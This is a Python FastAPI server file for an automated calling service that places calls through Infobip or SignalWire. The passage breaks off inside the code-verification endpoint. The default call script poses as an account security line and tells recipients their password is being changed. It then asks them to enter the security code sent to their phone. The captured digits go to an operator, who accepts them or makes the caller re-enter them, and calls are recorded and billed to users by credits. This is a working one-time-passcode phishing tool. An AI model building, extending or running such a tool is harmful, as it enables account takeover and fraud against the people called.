from fastapi import FastAPI, APIRouter, HTTPException, BackgroundTasks, Request
from fastapi.responses import StreamingResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone
import asyncio
import json
import httpx

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Infobip configuration
INFOBIP_BASE_URL = os.environ.get('INFOBIP_BASE_URL', '')
INFOBIP_API_KEY = os.environ.get('INFOBIP_API_KEY', '')
INFOBIP_FROM_NUMBER = os.environ.get('INFOBIP_FROM_NUMBER', '+18085821342')
INFOBIP_NUMBER_ID = os.environ.get('INFOBIP_NUMBER_ID', '')
INFOBIP_APP_NAME = os.environ.get('INFOBIP_APP_NAME', 'AmericanClub1')
INFOBIP_APP_ID = os.environ.get('INFOBIP_APP_ID', '')
INFOBIP_CONFIG_ID = os.environ.get('INFOBIP_CONFIG_ID', '')

# SignalWire configuration
SIGNALWIRE_PROJECT_ID = os.environ.get('SIGNALWIRE_PROJECT_ID', '')
SIGNALWIRE_AUTH_TOKEN = os.environ.get('SIGNALWIRE_AUTH_TOKEN', '')
SIGNALWIRE_SPACE_URL = os.environ.get('SIGNALWIRE_SPACE_URL', '')
SIGNALWIRE_FROM_NUMBER = os.environ.get('SIGNALWIRE_FROM_NUMBER', '')

# Webhook URL for callbacks
WEBHOOK_BASE_URL = os.environ.get('WEBHOOK_BASE_URL', 'https://callgenius-23.preview.emergentagent.com')

# Create the main app
app = FastAPI(title="Bot Calling API")

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# SSE connections storage
sse_connections: Dict[str, asyncio.Queue] = {}

# Active calls mapping (call_id -> infobip_call_id)
active_calls: Dict[str, str] = {}

# HTTP client for Infobip
http_client: Optional[httpx.AsyncClient] = None

async def get_http_client() -> httpx.AsyncClient:
    global http_client
    if http_client is None:
        http_client = httpx.AsyncClient(
            base_url=INFOBIP_BASE_URL,
            headers={
                "Authorization": f"App {INFOBIP_API_KEY}",
                "Content-Type": "application/json",
                "Accept": "application/json"
            },
            timeout=30.0
        )
    return http_client

# ===================
# Pydantic Models
# ===================

class CallConfig(BaseModel):
    call_type: str = "Login Verification"
    voice_model: str = "Hera (Female, Mature)"
    from_number: str = INFOBIP_FROM_NUMBER
    recipient_number: str
    recipient_name: Optional[str] = None
    service_name: Optional[str] = None
    otp_digits: int = 6
    provider: str = "infobip"  # "infobip" or "signalwire"

class CallSteps(BaseModel):
    step1: str = "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account. We have received a request to change your password. If it was not you press 1, if it was you press 0."
    step2: str = "Thank you for your confirmation, to block this request. Please enter the {digits}-digit security code that we sent to your phone number."
    step3: str = "Thank you. Please hold for a moment while we verify your code."
    accepted: str = "Thank you for waiting. We will get back to you if we need further information thank you for your attention. Goodbye."
    rejected: str = "Thank you for waiting, the verification code you entered previously is incorrect. Please make sure you enter the correct code. Please enter {digits}-digit security code that we sent to your phone number."

class CallRequest(BaseModel):
    config: CallConfig
    steps: CallSteps

class CallLog(BaseModel):
    model_config = ConfigDict(extra="ignore")
    
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    config: CallConfig
    steps: CallSteps
    status: str = "PENDING"
    current_step: str = "step1"
    step1_retry_count: int = 0
    step2_retry_count: int = 0
    infobip_call_id: Optional[str] = None
    signalwire_call_sid: Optional[str] = None
    provider: str = "infobip"
    dtmf_step1: Optional[str] = None
    dtmf_code: Optional[str] = None
    dtmf_codes_history: List[str] = Field(default_factory=list)
    awaiting_verification: bool = False
    verification_result: Optional[str] = None
    started_at: Optional[str] = None
    ended_at: Optional[str] = None
    duration_seconds: int = 0
    error_message: Optional[str] = None
    recording_url: Optional[str] = None
    recording_sid: Optional[str] = None
    recording_duration: Optional[int] = None
    answered_by: Optional[str] = None  # human, machine_start, machine_end_beep, etc.
    created_at: str = Field(default_factory=lambda: datetime.now(timezone.utc).isoformat())
    events: List[Dict] = Field(default_factory=list)

# ===================
# Helper Functions
# ===================

async def broadcast_event(call_id: str, event: Dict):
    """Send event to SSE connections"""
    if call_id in sse_connections:
        try:
            await sse_connections[call_id].put(event)
        except Exception as e:
            logger.error(f"Error broadcasting event: {e}")

async def add_call_event(call_id: str, event_type: str, details: str, dtmf_code: Optional[str] = None, show_verify: bool = False):
    """Add event to call log and broadcast"""
    event = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "event_type": event_type,
        "details": details,
        "call_id": call_id
    }
    
    if dtmf_code:
        event["dtmf_code"] = dtmf_code
    
    if show_verify:
        event["show_verify"] = True
    
    await db.call_logs.update_one(
        {"id": call_id},
        {"$push": {"events": event}}
    )
    
    await broadcast_event(call_id, event)
    return event

# Voice name mapping
VOICE_MAP = {
    "hera": {"name": "Joanna", "language": "en"},
    "aria": {"name": "Kendra", "language": "en"},
    "apollo": {"name": "Matthew", "language": "en"},
    "zeus": {"name": "Joey", "language": "en"},
}

def prepare_tts_text(template: str, config: CallConfig) -> str:
    """Replace placeholders in TTS template"""
    text = template
    text = text.replace("{name}", config.recipient_name or "Customer")
    text = text.replace("{service}", config.service_name or "Account")
    text = text.replace("{digits}", str(config.otp_digits))
    return text

# ===================
# Infobip Calls API Functions
# ===================

async def create_calls_application():
    """Create or get Infobip Calls Application"""
    global INFOBIP_APP_ID
    
    if INFOBIP_APP_ID:
        return INFOBIP_APP_ID
    
    http = await get_http_client()
    
    # First try to list existing applications
    try:
        response = await http.get("/calls/1/applications")
        if response.status_code == 200:
            apps = response.json()
            if apps.get("results"):
                for app_data in apps["results"]:
                    if app_data.get("name") == "BotCallerIVR":
                        INFOBIP_APP_ID = app_data["id"]
                        logger.info(f"Found existing application: {INFOBIP_APP_ID}")
                        return INFOBIP_APP_ID
        elif response.status_code == 404:
            logger.warning("Calls API applications endpoint not available - Calls API may not be enabled for this account")
            return None
    except Exception as e:
        logger.warning(f"Error listing applications: {e}")
        return None
    
    # Create new application if listing succeeded but no app found
    try:
        payload = {
            "name": "BotCallerIVR",
            "configuration": {
                "actions": {
                    "url": f"{WEBHOOK_BASE_URL}/api/calls-webhook/actions",
                    "type": "application/json"
                },
                "events": {
                    "url": f"{WEBHOOK_BASE_URL}/api/calls-webhook/events",
                    "type": "application/json"
                }
            }
        }
        
        response = await http.post("/calls/1/applications", json=payload)
        logger.info(f"Create application response: {response.status_code} - {response.text}")
        
        if response.status_code in [200, 201]:
            result = response.json()
            INFOBIP_APP_ID = result.get("id")
            logger.info(f"Created new application: {INFOBIP_APP_ID}")
            return INFOBIP_APP_ID
    except Exception as e:
        logger.error(f"Error creating application: {e}")
    
    return None

async def create_outbound_call(call_id: str, config: CallConfig):
    """Create outbound call using Infobip Calls API"""
    try:
        http = await get_http_client()
        
        # Use configuration ID directly if available
        config_id = INFOBIP_CONFIG_ID
        if not config_id:
            # Fallback to creating/getting application
            config_id = await create_calls_application()
            if not config_id:
                await add_call_event(call_id, "CALL_ERROR", "Failed to get Infobip configuration")
                return None
        
        to_num = config.recipient_number.replace("+", "").replace(" ", "").replace("-", "")
        from_num = config.from_number.replace("+", "").replace(" ", "").replace("-", "")
        
        payload = {
            "endpoint": {
                "type": "PHONE",
                "phoneNumber": to_num
            },
            "from": from_num,
            "callsConfigurationId": config_id,
            "connectTimeout": 60,
            "machineDetection": {
                "enabled": True  # Enable AMD to detect human/voicemail
            }
        }
        
        logger.info(f"Creating outbound call: {json.dumps(payload)}")
        
        # Log call initiation
        await add_call_event(call_id, "CALL_INITIATED", f"Outbound request via {config.from_number} to {config.recipient_number}")
        
        response = await http.post("/calls/1/calls", json=payload)
        logger.info(f"Create call response: {response.status_code} - {response.text}")
        
        if response.status_code in [200, 201]:
            result = response.json()
            infobip_call_id = result.get("id")
            
            # Store mapping
            active_calls[call_id] = infobip_call_id
            
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"infobip_call_id": infobip_call_id, "status": "CALLING"}}
            )
            
            await add_call_event(call_id, "CALL_CREATED", f"Call ID: {infobip_call_id[:16]}...")
            
            return infobip_call_id
        else:
            error_msg = f"Failed to create call: {response.status_code} - {response.text}"
            await add_call_event(call_id, "CALL_ERROR", error_msg)
            return None
            
    except Exception as e:
        logger.error(f"Error creating call: {e}")
        await add_call_event(call_id, "CALL_ERROR", str(e))
        return None

async def say_text(infobip_call_id: str, text: str, language: str = "en"):
    """Play TTS on active call"""
    try:
        http = await get_http_client()
        
        payload = {
            "text": text,
            "language": language
        }
        
        logger.info(f"Saying text on call {infobip_call_id}: {text[:50]}...")
        
        response = await http.post(f"/calls/1/calls/{infobip_call_id}/say", json=payload)
        logger.info(f"Say response: {response.status_code} - {response.text}")
        
        return response.status_code in [200, 201, 202]
        
    except Exception as e:
        logger.error(f"Error saying text: {e}")
        return False

async def collect_dtmf(infobip_call_id: str, max_digits: int, timeout: int = 20, prompt_text: str = None):
    """Collect DTMF from active call"""
    try:
        http = await get_http_client()
        
        payload = {
            "maxDigits": max_digits,
            "timeout": timeout
        }
        
        if prompt_text:
            payload["prompt"] = {
                "say": {
                    "text": prompt_text,
                    "language": "en"
                }
            }
        
        logger.info(f"Collecting DTMF on call {infobip_call_id}, max: {max_digits}")
        
        response = await http.post(f"/calls/1/calls/{infobip_call_id}/collect", json=payload)
        logger.info(f"Collect response: {response.status_code} - {response.text}")
        
        return response.status_code in [200, 201, 202]
        
    except Exception as e:
        logger.error(f"Error collecting DTMF: {e}")
        return False

async def hangup_call(infobip_call_id: str):
    """Hangup active call"""
    try:
        http = await get_http_client()
        
        response = await http.post(f"/calls/1/calls/{infobip_call_id}/hangup")
        logger.info(f"Hangup response: {response.status_code}")
        
        return response.status_code in [200, 201, 202, 204]
        
    except Exception as e:
        logger.error(f"Error hanging up: {e}")
        return False

async def execute_ivr_step(call_id: str, step: str):
    """Execute IVR step on active call"""
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        return
    
    infobip_call_id = call_log.get("infobip_call_id")
    if not infobip_call_id:
        return
    
    config = CallConfig(**call_log["config"])
    steps = CallSteps(**call_log["steps"])
    
    voice_id = config.voice_model.split()[0].lower() if config.voice_model else "hera"
    voice_settings = VOICE_MAP.get(voice_id, VOICE_MAP["hera"])
    
    if step == "step1":
        # Play greeting and collect 1 digit
        text = prepare_tts_text(steps.step1, config)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"current_step": "step1"}})
        await add_call_event(call_id, "STEP1_PLAYING", "Playing greeting - Press 1 if NOT you, Press 0 if it was you")
        
        # Use collect with prompt
        success = await collect_dtmf(infobip_call_id, 1, 15, text)
        if not success:
            await add_call_event(call_id, "STEP1_ERROR", "Failed to start DTMF collection")
            
    elif step == "step2":
        # Play prompt and collect OTP digits
        text = prepare_tts_text(steps.step2, config)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"current_step": "step2"}})
        await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.otp_digits}-digit security code")
        
        success = await collect_dtmf(infobip_call_id, config.otp_digits, 20, text)
        if not success:
            await add_call_event(call_id, "STEP2_ERROR", "Failed to start DTMF collection")
            
    elif step == "step3":
        # Play verification wait message
        text = prepare_tts_text(steps.step3, config)
        await db.call_logs.update_one(
            {"id": call_id}, 
            {"$set": {"current_step": "step3", "awaiting_verification": True}}
        )
        await add_call_event(call_id, "STEP3_PLAYING", "Please wait while we verify your code...")
        
        success = await say_text(infobip_call_id, text)
        if success:
            await add_call_event(call_id, "AWAITING_VERIFICATION", "Waiting for Accept or Deny...", show_verify=True)
            
    elif step == "accepted":
        # Play accepted message and hangup
        text = prepare_tts_text(steps.accepted, config)
        await db.call_logs.update_one(
            {"id": call_id}, 
            {"$set": {"current_step": "accepted", "verification_result": "accepted", "awaiting_verification": False}}
        )
        await add_call_event(call_id, "VERIFICATION_ACCEPTED", "Code accepted! Playing final message...")
        
        await say_text(infobip_call_id, text)
        # Hangup will be triggered after SAY_FINISHED event
        
    elif step == "rejected":
        # Play rejected message and collect new code
        text = prepare_tts_text(steps.rejected, config)
        await db.call_logs.update_one(
            {"id": call_id}, 
            {"$set": {"current_step": "rejected", "awaiting_verification": False, "dtmf_code": None}}
        )
        await add_call_event(call_id, "VERIFICATION_REJECTED", "Code rejected! Asking for new code...")
        
        # Collect new code with rejected message as prompt
        success = await collect_dtmf(infobip_call_id, config.otp_digits, 20, text)

async def simulate_ivr_flow(call_id: str, config: CallConfig, steps: CallSteps):
    """Simulate IVR flow for demo/testing (single session)"""
    try:
        await asyncio.sleep(0.5)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "CALLING", "current_step": "step1"}})
        await add_call_event(call_id, "CALL_INITIATED", f"Outbound request via {config.from_number}")
        
        await asyncio.sleep(1)
        await add_call_event(call_id, "CALL_CREATED", "Call ID: SIM-12345...")
        
        await asyncio.sleep(1.5)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "RINGING"}})
        await add_call_event(call_id, "CALL_RINGING", "Target device is ringing...")
        
        await asyncio.sleep(2)
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "ESTABLISHED", "started_at": datetime.now(timezone.utc).isoformat()}})
        await add_call_event(call_id, "CALL_ESTABLISHED", "Call answered by recipient")
        
        await asyncio.sleep(0.5)
        await add_call_event(call_id, "AMD_DETECTION", "Human voice identified (AMD Success)")
        
        # Step 1
        await asyncio.sleep(1)
        await add_call_event(call_id, "STEP1_PLAYING", "Playing greeting - Press 1 if NOT you, Press 0 if it was you")
        await asyncio.sleep(4)
        dtmf_step1 = "1"
        await db.call_logs.update_one({"id": call_id}, {"$set": {"dtmf_step1": dtmf_step1, "current_step": "step2"}})
        await add_call_event(call_id, "INPUT_STREAM", f"{dtmf_step1}... (Step 1 Complete)", dtmf_step1)
        
        # Step 2
        await asyncio.sleep(1)
        await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.otp_digits}-digit security code")
        
        # Simulate digit-by-digit entry
        otp_code = "445588"
        for i, digit in enumerate(otp_code):
            await asyncio.sleep(0.5)
            partial_code = otp_code[:i+1]
            if i < len(otp_code) - 1:
                await add_call_event(call_id, "INPUT_STREAM", f"Receiving: {partial_code}...")
        
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"dtmf_code": otp_code, "current_step": "step3", "awaiting_verification": True},
             "$push": {"dtmf_codes_history": otp_code}}
        )
        await add_call_event(call_id, "CAPTURED_CODE", f"Security code: {otp_code}", otp_code, show_verify=True)
        
        # Step 3 - Wait for verification
        await asyncio.sleep(0.5)
        await add_call_event(call_id, "STEP3_PLAYING", "Please hold while we verify your code...")
        await add_call_event(call_id, "AWAITING_VERIFICATION", "Call on HOLD - Waiting for Accept or Deny...", show_verify=True)
        
        # In simulation, call stays active until user clicks Accept/Deny
        # The verification endpoint will handle the next step
        
    except Exception as e:
        logger.error(f"Error in simulation: {e}")
        await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "FAILED", "error_message": str(e)}})
        await add_call_event(call_id, "CALL_FAILED", str(e))

# ===================
# API Endpoints
# ===================

@api_router.get("/")
async def root():
    return {
        "message": "Bot Calling API",
        "status": "running",
        "infobip_configured": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL),
        "mode": "Calls API (Single Session IVR)"
    }

@api_router.get("/config")
async def get_config():
    return {
        "infobip_configured": bool(INFOBIP_API_KEY and INFOBIP_BASE_URL),
        "signalwire_configured": bool(SIGNALWIRE_PROJECT_ID and SIGNALWIRE_AUTH_TOKEN and SIGNALWIRE_SPACE_URL),
        "infobip_from_number": INFOBIP_FROM_NUMBER,
        "signalwire_from_number": SIGNALWIRE_FROM_NUMBER,
        "app_name": INFOBIP_APP_NAME,
        "app_id": INFOBIP_APP_ID
    }

# ===================
# SignalWire Functions
# ===================

async def create_signalwire_call(call_id: str, config: CallConfig, steps: CallSteps):
    """Create outbound call using SignalWire API with AMD"""
    try:
        import base64
        
        # SignalWire uses Basic Auth
        auth_string = f"{SIGNALWIRE_PROJECT_ID}:{SIGNALWIRE_AUTH_TOKEN}"
        auth_bytes = base64.b64encode(auth_string.encode()).decode()
        
        to_num = config.recipient_number.replace(" ", "").replace("-", "")
        if not to_num.startswith("+"):
            to_num = f"+{to_num}"
        
        from_num = config.from_number.replace(" ", "").replace("-", "")
        if not from_num.startswith("+"):
            from_num = f"+{from_num}"
        
        # Build webhook URLs for SignalWire
        webhook_url = f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice"
        status_callback = f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/status"
        recording_callback = f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/recording"
        amd_callback = f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/amd"
        
        payload = {
            "Url": webhook_url,
            "To": to_num,
            "From": from_num,
            "StatusCallback": status_callback,
            "StatusCallbackEvent": ["initiated", "ringing", "answered", "completed"],
            # Enable call recording
            "Record": "true",
            "RecordingStatusCallback": recording_callback,
            "RecordingStatusCallbackEvent": "completed",
            # Enable AMD (Answering Machine Detection)
            "MachineDetection": "DetectMessageEnd",
            "MachineDetectionTimeout": "30",
            "MachineDetectionSpeechThreshold": "2400",
            "AsyncAmd": "true",
            "AsyncAmdStatusCallback": amd_callback,
            "AsyncAmdStatusCallbackMethod": "POST"
        }
        
        logger.info(f"Creating SignalWire call with AMD & recording: {json.dumps(payload)}")
        
        await add_call_event(call_id, "CALL_INITIATED", f"Outbound request via {from_num} to {to_num} (AMD + Recording)")
        
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"https://{SIGNALWIRE_SPACE_URL}/api/laml/2010-04-01/Accounts/{SIGNALWIRE_PROJECT_ID}/Calls.json",
                data=payload,
                headers={
                    "Authorization": f"Basic {auth_bytes}",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                timeout=30.0
            )
            
            logger.info(f"SignalWire response: {response.status_code} - {response.text[:500] if response.text else 'EMPTY'}")
            
            if response.status_code in [200, 201]:
                # Handle empty response body
                if not response.text or response.text.strip() == "":
                    error_msg = "SignalWire returned empty response - call may have been rate limited or invalid"
                    logger.error(error_msg)
                    await add_call_event(call_id, "CALL_ERROR", error_msg)
                    return None
                
                try:
                    result = response.json()
                except Exception as json_err:
                    error_msg = f"Failed to parse SignalWire response: {str(json_err)}"
                    logger.error(error_msg)
                    await add_call_event(call_id, "CALL_ERROR", error_msg)
                    return None
                    
                call_sid = result.get("sid")
                
                if not call_sid:
                    error_msg = "SignalWire response missing call SID"
                    await add_call_event(call_id, "CALL_ERROR", error_msg)
                    return None
                
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"signalwire_call_sid": call_sid, "status": "CALLING", "provider": "signalwire"}}
                )
                
                await add_call_event(call_id, "CALL_CREATED", f"Call SID: {call_sid[:16]}...")
                
                return call_sid
            else:
                error_msg = f"Failed to create call: {response.status_code} - {response.text}"
                await add_call_event(call_id, "CALL_ERROR", error_msg)
                return None
                
    except Exception as e:
        logger.error(f"Error creating SignalWire call: {e}")
        await add_call_event(call_id, "CALL_ERROR", str(e))
        return None

@api_router.post("/calls/initiate", response_model=Dict)
async def initiate_call(
    request: CallRequest, 
    background_tasks: BackgroundTasks,
    current_user: dict = None  # Will be injected via dependency
):
    """Initiate a new single-session IVR call"""
    from auth import get_current_active_user
    from fastapi import Request as FastAPIRequest
    
    try:
        provider = request.config.provider
        
        # Get user_id from request header token (optional for now)
        user_id = request.config.dict().get("user_id") if hasattr(request.config, "user_id") else None
        
        call_log = CallLog(
            config=request.config,
            steps=request.steps,
            provider=provider
        )
        
        # Add user_id to call log
        doc = call_log.model_dump()
        if user_id:
            doc["user_id"] = user_id
        
        await db.call_logs.insert_one(doc)
        
        await add_call_event(call_log.id, "CALL_QUEUED", f"Single-session IVR call queued ({provider.upper()})")
        
        use_simulation = True
        simulation_reason = "Simulation mode"
        
        if provider == "signalwire":
            # Use SignalWire
            if SIGNALWIRE_PROJECT_ID and SIGNALWIRE_AUTH_TOKEN and SIGNALWIRE_SPACE_URL:
                call_sid = await create_signalwire_call(call_log.id, request.config, request.steps)
                if call_sid:
                    use_simulation = False
                else:
                    simulation_reason = "Failed to create SignalWire call"
            else:
                simulation_reason = "SignalWire not configured"
                await add_call_event(call_log.id, "CALL_INFO", simulation_reason)
        else:
            # Use Infobip
            if INFOBIP_API_KEY and INFOBIP_BASE_URL:
                if INFOBIP_CONFIG_ID:
                    infobip_call_id = await create_outbound_call(call_log.id, request.config)
                    if infobip_call_id:
                        use_simulation = False
                    else:
                        simulation_reason = "Failed to create Infobip call"
                else:
                    app_id = await create_calls_application()
                    if app_id:
                        infobip_call_id = await create_outbound_call(call_log.id, request.config)
                        if infobip_call_id:
                            use_simulation = False
                        else:
                            simulation_reason = "Failed to create Infobip call"
                    else:
                        simulation_reason = "Infobip Calls API not configured"
                        await add_call_event(call_log.id, "CALL_INFO", simulation_reason)
            else:
                simulation_reason = "Infobip not configured"
        
        if use_simulation:
            await add_call_event(call_log.id, "SIMULATION_MODE", f"Running in simulation: {simulation_reason}")
            background_tasks.add_task(simulate_ivr_flow, call_log.id, request.config, request.steps)
        
        return {
            "status": "initiated",
            "call_id": call_log.id,
            "message": f"Single-session IVR call initiated via {provider.upper()}",
            "provider": provider,
            "using_live": not use_simulation,
            "mode": f"Live {provider.upper()}" if not use_simulation else "Simulation"
        }
        
    except Exception as e:
        logger.error(f"Error initiating call: {e}")
        raise HTTPException(status_code=500, detail=str(e))


# Minimum credits required to start a call
MIN_CREDITS_FOR_CALL = 2


@api_router.post("/user/calls/initiate", response_model=Dict)
async def initiate_user_call(request: CallRequest, background_tasks: BackgroundTasks, req: Request):
    """Initiate call with credit check for authenticated users"""
    from auth import get_current_active_user, security
    from fastapi.security import HTTPAuthorizationCredentials
    
    try:
        # Get token from header
        auth_header = req.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            raise HTTPException(status_code=401, detail="Authentication required")
        
        token = auth_header.replace("Bearer ", "")
        
        # Verify user
        from auth import decode_token
        payload = decode_token(token)
        if not payload:
            raise HTTPException(status_code=401, detail="Invalid token")
        
        user_id = payload.get("sub")
        user = await db.users.find_one({"id": user_id}, {"_id": 0})
        
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        
        if not user.get("is_active"):
            raise HTTPException(status_code=403, detail="Account is disabled")
        
        # Check credits
        current_credits = user.get("credits", 0)
        if current_credits < MIN_CREDITS_FOR_CALL:
            raise HTTPException(
                status_code=402,
                detail=f"Insufficient credits. You need at least {MIN_CREDITS_FOR_CALL} credits to start a call. Current balance: {current_credits}"
            )
        
        provider = request.config.provider
        
        call_log = CallLog(
            config=request.config,
            steps=request.steps,
            provider=provider
        )
        
        doc = call_log.model_dump()
        doc["user_id"] = user_id
        doc["user_credits_at_start"] = current_credits
        
        await db.call_logs.insert_one(doc)
        
        await add_call_event(call_log.id, "CALL_QUEUED", f"Call queued ({provider.upper()}) - Credits: {current_credits}")
        
        use_simulation = True
        simulation_reason = "Simulation mode"
        
        if provider == "signalwire":
            if SIGNALWIRE_PROJECT_ID and SIGNALWIRE_AUTH_TOKEN and SIGNALWIRE_SPACE_URL:
                call_sid = await create_signalwire_call(call_log.id, request.config, request.steps)
                if call_sid:
                    use_simulation = False
                else:
                    simulation_reason = "Failed to create SignalWire call"
            else:
                simulation_reason = "SignalWire not configured"
        else:
            if INFOBIP_API_KEY and INFOBIP_BASE_URL and INFOBIP_CONFIG_ID:
                infobip_call_id = await create_outbound_call(call_log.id, request.config)
                if infobip_call_id:
                    use_simulation = False
                else:
                    simulation_reason = "Failed to create Infobip call"
            else:
                simulation_reason = "Infobip not configured"
        
        if use_simulation:
            await add_call_event(call_log.id, "SIMULATION_MODE", f"Using simulation: {simulation_reason}")
            background_tasks.add_task(simulate_ivr_flow, call_log.id, request.config, request.steps)
        
        return {
            "status": "initiated",
            "call_id": call_log.id,
            "message": f"Call initiated via {provider.upper()}",
            "provider": provider,
            "using_live": not use_simulation,
            "mode": f"Live {provider.upper()}" if not use_simulation else "Simulation",
            "user_credits": current_credits
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error initiating user call: {e}")
        raise HTTPException(status_code=500, detail=str(e))


async def deduct_user_credits(call_id: str, duration_seconds: int):
    """Deduct credits from user after call ends"""
    try:
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        if not call_log:
            return
        
        user_id = call_log.get("user_id")
        if not user_id:
            return
        
        # Calculate credits to deduct (1 credit per minute, rounded up)
        import math
        minutes = math.ceil(duration_seconds / 60) if duration_seconds > 0 else 1
        credits_to_deduct = minutes
        
        # Get user
        user = await db.users.find_one({"id": user_id}, {"_id": 0})
        if not user:
            return
        
        current_credits = user.get("credits", 0)
        new_credits = max(0, current_credits - credits_to_deduct)
        
        # Update user credits
        await db.users.update_one(
            {"id": user_id},
            {
                "$set": {"credits": new_credits},
                "$inc": {"total_credits_used": credits_to_deduct}
            }
        )
        
        # Update call log with credits used
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"credits_used": credits_to_deduct}}
        )
        
        # Add credit transaction
        await db.credit_transactions.insert_one({
            "id": str(uuid.uuid4()),
            "user_id": user_id,
            "type": "call_deduction",
            "amount": -credits_to_deduct,
            "balance_after": new_credits,
            "reason": f"Call duration: {duration_seconds}s ({minutes} min)",
            "call_id": call_id,
            "created_at": datetime.now(timezone.utc).isoformat()
        })
        
        # Broadcast credit update via SSE
        await broadcast_event(call_id, {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event_type": "CREDITS_DEDUCTED",
            "details": f"Credits deducted: {credits_to_deduct} (Remaining: {new_credits})",
            "credits_deducted": credits_to_deduct,
            "credits_remaining": new_credits,
            "call_id": call_id
        })
        
        logger.info(f"Deducted {credits_to_deduct} credits from user {user_id}. Remaining: {new_credits}")
        
    except Exception as e:
        logger.error(f"Error deducting credits: {e}")


@api_router.get("/user/credits")
async def get_user_credits(req: Request):
    """Get current user's credit balance"""
    from auth import decode_token
    
    auth_header = req.headers.get("Authorization", "")
    if not auth_header.startswith("Bearer "):
        raise HTTPException(status_code=401, detail="Authentication required")
    
    token = auth_header.replace("Bearer ", "")
    payload = decode_token(token)
    
    if not payload:
        raise HTTPException(status_code=401, detail="Invalid token")
    
    user_id = payload.get("sub")
    user = await db.users.find_one({"id": user_id}, {"_id": 0, "password": 0})
    
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    return {
        "credits": user.get("credits", 0),
        "total_used": user.get("total_credits_used", 0)
    }

@api_router.post("/calls/{call_id}/verify")
async def verify_code(call_id: str, request: Request, background_tasks: BackgroundTasks):
    """Accept or Deny the entered code - triggers next IVR step"""
    try:
        data = await request.json()
        is_accepted = data.get("accepted", False)
        
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        
        if not call_log:
            raise HTTPException(status_code=404, detail="Call not found")
        
        infobip_call_id = call_log.get("infobip_call_id")
        signalwire_call_sid = call_log.get("signalwire_call_sid")
        provider = call_log.get("provider", "infobip")
        
        if is_accepted:
            # Accept - play accepted message then hangup
            if provider == "signalwire" and signalwire_call_sid:
                # Update SignalWire call
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"verification_result": "accepted", "current_step": "accepted", "awaiting_verification": False}}
                )
                await add_call_event(call_id, "VERIFICATION_ACCEPTED", "Code accepted!")
                
                # Continue SignalWire call with accepted message
                try:
                    import base64
                    auth_string = f"{SIGNALWIRE_PROJECT_ID}:{SIGNALWIRE_AUTH_TOKEN}"
                    auth_bytes = base64.b64encode(auth_string.encode()).decode()
                    
                    steps = call_log.get("steps", {})
                    config = call_log.get("config", {})
                    voice = config.get("voice_model", "Polly.Joanna-Neural")
                    voice_attr = get_voice_attribute(voice)
                    message = format_tts_message(steps.get("accepted", "Thank you. Goodbye."), config)
                    
                    laml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="{voice_attr}">{message}</Say>
    <Hangup/>
</Response>'''
                    
                    async with httpx.AsyncClient() as client:
                        response = await client.post(
                            f"https://{SIGNALWIRE_SPACE_URL}/api/laml/2010-04-01/Accounts/{SIGNALWIRE_PROJECT_ID}/Calls/{signalwire_call_sid}.json",
                            data={"Twiml": laml},
                            headers={
                                "Authorization": f"Basic {auth_bytes}",
                                "Content-Type": "application/x-www-form-urlencoded"
                            },
                            timeout=30.0
                        )
                        logger.info(f"SignalWire accept response: {response.status_code}")
                    
                    await add_call_event(call_id, "ACCEPTED_PLAYING", "Playing: Thank you message...")
                except Exception as e:
                    logger.error(f"Error updating SignalWire call: {e}")
                    
            elif infobip_call_id and INFOBIP_API_KEY:
                background_tasks.add_task(execute_ivr_step, call_id, "accepted")
            else:
                # Simulation
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {
                        "verification_result": "accepted",
                        "current_step": "accepted",
                        "awaiting_verification": False,
                        "status": "FINISHED",
                        "ended_at": datetime.now(timezone.utc).isoformat()
                    }}
                )
                await add_call_event(call_id, "VERIFICATION_ACCEPTED", "Code accepted!")
                await add_call_event(call_id, "ACCEPTED_PLAYING", "Playing: Thank you message...")
                await add_call_event(call_id, "CALL_FINISHED", "Call completed successfully")
        else:
            # Deny - play rejected message and collect new code
            if provider == "signalwire" and signalwire_call_sid:
                await db.call_logs.update_one(
                    {"id": call_id},
